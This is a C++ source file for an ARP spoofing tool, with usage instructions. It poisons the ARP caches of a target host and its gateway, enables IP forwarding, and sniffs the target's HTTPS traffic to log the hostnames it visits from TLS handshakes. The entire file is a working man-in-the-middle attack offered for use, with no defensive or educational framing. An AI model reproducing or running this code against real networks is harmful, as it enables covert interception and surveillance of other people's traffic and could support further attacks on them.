// Compile: g++ -o arp_ssl_grab arp_ssl_grab.cpp -lpthread
// Run: sudo ./arp_ssl_grab <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface> <logfile>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <fstream>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPSslGrab {
private:
    int arpSock, packetSock;
    std::string iface, attackerMAC, logPath;
    std::atomic<bool> running{false};
    std::ofstream log;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPSslGrab(const std::string& i, const std::string& amac, const std::string& lp)
        : iface(i), attackerMAC(amac), logPath(lp) {
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        packetSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(packetSock, (struct sockaddr*)&sll, sizeof(sll));
        
        log.open(logPath, std::ios::app);
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop(const std::string& targetIP, const std::string& targetMAC,
                    const std::string& gatewayIP, const std::string& gatewayMAC) {
        while (running.load()) {
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    // Grab SSL/TLS metadata - SNI, session cookies in HTTP-over-TLS not possible
    // but we capture: SNI (unencrypted in ClientHello), TLS version, ciphersuites
    void sslGrabLoop(const std::string& targetIP) {
        uint8_t buffer[65536];
        struct in_addr targetAddr;
        inet_pton(AF_INET, targetIP.c_str(), &targetAddr);
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(packetSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(packetSock, buffer, sizeof(buffer), 0);
            if (bytes < 54) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            if (ip->saddr != targetAddr.s_addr && ip->daddr != targetAddr.s_addr) continue;
            if (ip->protocol != IPPROTO_TCP) continue;
            
            struct tcphdr* tcp = (struct tcphdr*)(buffer + 14 + (ip->ihl * 4));
            int srcPort = ntohs(tcp->source);
            int dstPort = ntohs(tcp->dest);
            
            // HTTPS ports
            if (srcPort != 443 && dstPort != 443 && srcPort != 8443 && dstPort != 8443) continue;
            
            int payloadOffset = 14 + (ip->ihl * 4) + (tcp->doff * 4);
            int payloadLen = ntohs(ip->tot_len) - (ip->ihl * 4) - (tcp->doff * 4);
            
            if (payloadLen < 6) continue;
            
            char* payload = (char*)(buffer + payloadOffset);
            
            // TLS record type = 22 (handshake)
            if (payload[0] == 0x16) {
                char srcIP[INET_ADDRSTRLEN], dstIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &ip->saddr, srcIP, sizeof(srcIP));
                inet_ntop(AF_INET, &ip->daddr, dstIP, sizeof(dstIP));
                
                // Look for SNI extension in ClientHello
                // TLS handshake: byte 5 = 0x01 (ClientHello)
                if (payloadLen > 43 && payload[5] == 0x01) {
                    log << "[TLS ClientHello] " << srcIP << ":" << srcPort 
                        << " -> " << dstIP << ":" << dstPort << " ";
                    
                    // Scan for SNI (extension type 0x0000)
                    for (int i = 43; i < payloadLen - 10; i++) {
                        if (payload[i] == 0x00 && payload[i+1] == 0x00) {
                            // SNI found - extract hostname
                            int sniLen = (unsigned char)payload[i+8] << 8 | 
                                         (unsigned char)payload[i+9];
                            if (sniLen > 0 && sniLen < 256 && i + 10 + sniLen <= payloadLen) {
                                log << "SNI=" << std::string(payload + i + 10, sniLen);
                            }
                            break;
                        }
                    }
                    log << "\n";
                    log.flush();
                }
            }
        }
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& gatewayIP, const std::string& gatewayMAC) {
        std::cout << "[*] ARP + SSL/TLS SNI grabber\n";
        std::cout << "[*] Logging to: " << logPath << "\n";
        
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        
        running = true;
        std::thread arpThread(&ARPSslGrab::poisonLoop, this,
                              targetIP, targetMAC, gatewayIP, gatewayMAC);
        std::thread sslThread(&ARPSslGrab::sslGrabLoop, this, targetIP);
        
        while (true) sleep(1);
    }
    
    ~ARPSslGrab() {
        running = false;
        if (log.is_open()) log.close();
        close(arpSock);
        close(packetSock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 8) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface> <logfile>\n";
        return 1;
    }
    ARPSslGrab grab(argv[6], argv[5], argv[7]);
    grab.run(argv[1], argv[2], argv[3], argv[4]);
    return 0;
}
